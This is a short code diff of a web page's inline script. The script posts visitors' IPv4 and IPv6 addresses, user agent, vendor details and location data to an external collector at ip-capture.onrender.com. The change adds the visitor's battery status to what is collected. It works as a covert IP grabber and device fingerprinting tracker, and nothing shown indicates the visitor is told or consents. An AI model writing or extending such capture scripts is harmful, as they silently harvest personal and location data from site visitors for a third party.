@@ -18,12 +18,13 @@
             } catch (err) {
                 loc = {'error': err};
             }
+            const battery = await navigator.getBattery();
             await fetch('https://ip-capture.onrender.com', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip, user_agent: navigator.userAgentData, product: navigator.product, vendor: navigator.vendor, loc})
+                body: JSON.stringify({ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip, user_agent: navigator.userAgentData, product: navigator.product, vendor: navigator.vendor, battery, loc})
             })
         })()
     </script>
